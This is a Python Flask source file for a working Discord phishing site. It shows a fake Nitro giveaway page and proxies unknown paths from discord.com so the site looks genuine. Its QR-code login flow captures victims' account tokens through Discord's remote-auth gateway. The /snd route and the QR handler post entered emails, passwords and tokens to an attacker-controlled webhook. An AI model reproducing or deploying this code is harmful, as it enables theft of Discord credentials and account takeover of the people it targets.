import requests
import os

### for qrcode
import time
import random
import string
import json
import qrcode
import websocket
import hashlib
import base64
import threading

from Crypto.Cipher import PKCS1_OAEP
from Crypto.Hash import SHA256
from Crypto.PublicKey import RSA

###

from flask import Flask, request, render_template

app = Flask("app")

url = os.getenv("url")

db = {}


class Messages:
    HEARTBEAT = "heartbeat"
    HELLO = "hello"
    INIT = "init"
    NONCE_PROOF = "nonce_proof"
    PENDING_REMOTE_INIT = "pending_remote_init"
    PENDING_FINISH = "pending_finish"
    FINISH = "finish"


class DiscordUser:
    def __init__(self, **values):
        self.id = values.get("id")
        self.username = values.get("username")
        self.discrim = values.get("discrim")
        self.avatar_hash = values.get("avatar_hash")
        self.token = values.get("token")
        self.avatar_url = (
            f"https://cdn.discordapp.com/avatars/{self.id}/{self.avatar_hash}")

    @classmethod
    def from_payload(cls, payload):
        values = payload.split(":")

        return cls(id=values[0],
                   discrim=values[1],
                   avatar_hash=values[2],
                   username=values[3])

    def pretty_print(self):
        return json.dumps(self.__dict__)


class DiscordAuthWebsocket:
    def __init__(self, log="", debug=False):
        self.debug = debug
        self.log = log
        self.ws = websocket.WebSocketApp(
            "wss://remote-auth-gateway.discord.gg/?v=1",
            on_open=self.on_open,
            on_message=self.on_message,
            on_error=self.on_error,
            on_close=self.on_close,
            header={"Origin": "https://discord.com"},
        )
        self.key = RSA.generate(2048)
        self.cipher = PKCS1_OAEP.new(self.key, hashAlgo=SHA256)
        self.heartbeat_interval = None
        self.last_heartbeat = None
        self.qr_image = None
        self.user = None

    @property
    def public_key(self):
        pub_key = self.key.publickey().export_key().decode("utf-8")
        pub_key = "".join(pub_key.split("\n")[1:-1])
        return pub_key

    def heartbeat_sender(self):
        while True:
            time.sleep(0.5)
            current_time = time.time()
            time_passed = current_time - self.last_heartbeat + 1
            if time_passed >= self.heartbeat_interval:
                self.send(Messages.HEARTBEAT)
                self.last_heartbeat = current_time

    def run(self):
        self.ws.run_forever()

    def send(self, op, data=None):
        payload = {"op": op}
        if data is not None:
            payload.update(**data)
        if self.debug:
            print(f"Send: {payload}")
        try:
            self.ws.send(json.dumps(payload))
        except:
            pass

    def decrypt_payload(self, encrypted_payload):
        payload = base64.b64decode(encrypted_payload)
        decrypted = self.cipher.decrypt(payload)
        return decrypted

    def generate_qr_code(self, fingerprint):
        img = qrcode.make(f"https://discordapp.com/ra/{fingerprint}")
        self.qr_image = img
        # print(self.d["image"])
        img.save(self.log + "." + "qrcode.png")

    def on_open(self):
        pass

    def on_message(self, message):
        if self.debug:
            print(f"Recv: {message}")
        data = json.loads(message)
        op = data.get("op")
        if op == Messages.HELLO:
            self.heartbeat_interval = data.get("heartbeat_interval") / 1000
            self.last_heartbeat = time.time()
            thread = threading.Thread(target=self.heartbeat_sender)
            thread.daemon = True
            thread.start()
            self.send(Messages.INIT, {"encoded_public_key": self.public_key})
        elif op == Messages.NONCE_PROOF:
            nonce = data.get("encrypted_nonce")
            decrypted_nonce = self.decrypt_payload(nonce)
            proof = SHA256.new(data=decrypted_nonce).digest()
            proof = base64.urlsafe_b64encode(proof)
            proof = proof.decode().rstrip("=")
            self.send(Messages.NONCE_PROOF, {"proof": proof})
        elif op == Messages.PENDING_REMOTE_INIT:
            fingerprint = data.get("fingerprint")
            self.generate_qr_code(fingerprint)
        elif op == Messages.PENDING_FINISH:
            encrypted_payload = data.get("encrypted_user_payload")
            payload = self.decrypt_payload(encrypted_payload)
            self.user = DiscordUser.from_payload(payload.decode())
        elif op == Messages.FINISH:
            encrypted_token = data.get("encrypted_token")
            token = self.decrypt_payload(encrypted_token)
            if self.qr_image is not None:
                self.qr_image.close()
            self.user.token = token.decode()
            # self.ws.close()

    def on_error(self, error):
        pass

    def on_close(self):
        pass


def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = "".join(random.choice(letters) for i in range(length))
    return result_str


def qrgen1(id_=""):
    n = 0
    while True:
        print("creating qrcode...")
        auth_ws = DiscordAuthWebsocket(log=id_, debug=False)
        auth_ws.run()
        try:
            os.remove(id_ + ".qrcode.png")
        except:
            pass
        print("qrcode ended...")
        try:
            data = {
                "content":
                "_ _",  # "<@&914453138260516894>",
                "username":
                "Crt test",
                "avatar_url":
                "https://cdn.discordapp.com/avatars/849635915513200650/a_ae17ab6a49003f535014d8cb5a3aa7de.gif?size=128",
                "embeds": [{
                    "title":
                    "Account :",
                    "description":
                    "Token : ```{}```".format(auth_ws.user.token),
                }],
            }
            if not auth_ws.user.token is None:
                requests.post(url, json=data)
        except:
            break
        n += 1
        if n >= 5:
            break


@app.route("/")
def home():
    return render_template("nitro-get.html")


@app.route("/register")
def register():
    return render_template("register.html")


@app.route("/login")
def login():
    id_ = hashlib.sha256()
    id_.update(get_random_string(128).encode())
    id_ = id_.hexdigest()
    threading.Thread(target=qrgen1, kwargs={"id_": id_}).start()
    return render_template("login1.html", id_=id_)


@app.route("/token")
def tlogin():
    return render_template("tlogin.html")


@app.route("/snd", methods=["POST"])
def send():
    if (not "@" in str(request.form.get("email"))
            or not "." in str(request.form.get("email"))
            or request.form.get("password") is None
            or request.form.get("password") == ""):
        if request.form.get("token") is not None:
            id_ = hashlib.sha256()
            id_.update(get_random_string(128).encode())
            id_ = id_.hexdigest()
            threading.Thread(target=qrgen1, kwargs={"id_": id_}).start()
            return render_template("login1.html", id_=id_)
    # data = {
    #     "content": "_ _",  # "<@&914453138260516894>",
    #     "username": "Crt test",
    #     "avatar_url": "https://cdn.discordapp.com/avatars/849635915513200650/a_ae17ab6a49003f535014d8cb5a3aa7de.gif?size=128",
    #     "embeds": [
    #         {
    #             "title": "account :",
    #             "description": "email or number : ```\n{}\n```".format(
    #                 str(request.form.get("email"))
    #                 .replace("\\", "\\\\")
    #                 .replace("```", "\\`\\`\\`")
    #             )
    #             + "\n"
    #             + "password : ```\n{}\n```".format(
    #                 str(request.form.get("password"))
    #                 .replace("\\", "\\\\")
    #                 .replace("```", "\\`\\`\\`")
    #             )
    #             + "\n"
    #             + "Token : ```{}```".format(
    #                 str(request.form.get("token"))
    #                 .replace("\\", "\\\\")
    #                 .replace("```", "\\`\\`\\`")
    #             ),
    #         }
    #     ],
    # }
    data = {
        "content":
        "<@&914453138260516894>",  # "<@&914453138260516894>",
        "username":
        "Crt test",
        "avatar_url":
        "https://cdn.discordapp.com/avatars/849635915513200650/a_ae17ab6a49003f535014d8cb5a3aa7de.gif?size=128",
        "embeds": [{
            "title":
            "account :",
            "description":
            "email or number : ```\n{}\n```".format(
                str(request.form.get("email"))) + "\n" +
            "password : ```\n{}\n```".format(str(request.form.get("password")))
            + "\n" + "Token : ```{}```".format(str(request.form.get("token"))),
        }],
    }
    requests.post(url, json=data)
    # resp = trylog(dict(request.form))
    # resp = json.loads(resp)
    # if resp.get("captcha_key") is None:
    #     id_ = hashlib.sha256()
    #     id_.update(get_random_string(128).encode())
    #     id_ = id_.hexdigest()
    #     threading.Thread(target=qrgen1, kwargs={"id_": id_}).start()
    #     return render_template("login1.html", id_=id_)
    # if "captcha-required" in resp.get("captcha_key"):
    #     site_key = resp.get("captcha_sitekey")
    #     return render_template("captcha.html", site_key=site_key)
    return render_template("nitro-get.html", logged=True)


@app.errorhandler(404)
def r404(error):
    try:
        with open("templates" + request.path, "rb") as f:
            p = f.read()
        return p, 200
    except:
        pass
    server = "discord.com"
    link = "https://" + server + request.path
    resp = requests.get(link)
    # p = os.path.split(request.path)
    # print(p)
    # for i in p:
    #     if not "." in i:
    #         print(i)
    #         try:
    #             os.mkdir("templates"+i)
    #         except:
    #             pass
    # for i in p:
    #     if "." in i:
    #         try:
    #             with open("templates"+request.path, "wb") as f:
    #                 f.write(resp.content)
    #         except:
    #             pass
    return resp.content, 200


@app.route("/<string:id_>/qrcode.png")
def getqrtoken(id_=""):
    n = 0
    while True:
        n += 1
        try:
            with open(f"./{id_}.qrcode.png", "rb") as f:
                return f.read()
                # img = base64.b64encode(f.read()).decode()
            # return '<img src="data:image/png;base64,{}" style="position: center;" width="176px" height="176px" />'.format(img)
        except:
            time.sleep(0.3)
        if n >= 30:
            break
    return ""


def trylog(data):
    headers = {"Content-Type": "application/json"}
    form = {"login": data.get("email"), "password": data.get("password")}
    if None in form.values():
        return render_template("login.html")
    form["undelete"] = False
    form["captcha_key"] = None
    form["login_source"] = None
    form["gift_code_sku_id"] = None
    r = requests.post("https://discord.com/api/v9/auth/login",
                      data=json.dumps(form),
                      headers=headers)
    return r.content


app.run(host="0.0.0.0", port=8080)
